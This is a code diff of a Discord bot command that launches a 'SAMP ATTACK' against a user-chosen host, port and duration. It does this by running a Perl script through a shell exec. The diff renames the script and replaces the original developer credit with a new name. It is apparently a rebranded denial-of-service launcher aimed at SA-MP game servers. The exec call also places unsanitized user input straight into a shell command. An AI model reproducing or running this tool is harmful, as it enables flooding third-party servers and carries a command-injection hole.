@@ -25,7 +25,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`perl Test.pl ${host} ${port} ${duration}`, (error, stdout, stderr) => {
+exec(`perl samp.pl ${host} ${port} ${duration}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -34,10 +34,10 @@ setTimeout(function(){
 
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('🚀 **SAMP ATTACK BY VenThing** 🚀')
+	.setTitle('🚀 **SAMP ATTACK BY LIZNDYA** 🚀')
 	.setTimestamp()
   .setDescription("**Host** : `" + host + "` \n **Port** : `" + port + "` \n **Methods** : `SAMP 💣` \n **Time** : `" + duration + "`")
-	.setFooter('© Developer: VenThing#3280', client.user.avatarURL)
+	.setFooter('© Developer: ROMEO', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(attackgif)
 	.setThumbnail("")
@@ -59,7 +59,7 @@ const embed = new Discord.MessageEmbed()
 	.setTitle('🚀 **SAMP** 🚀')
 	.setTimestamp()
 	.setDescription("**► Attack loading **")
-	.setFooter('© Developer: VenThing#3280', client.user.avatarURL)
+	.setFooter('© Developer: ROMEO', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(loadinggif)
 	.setThumbnail("")
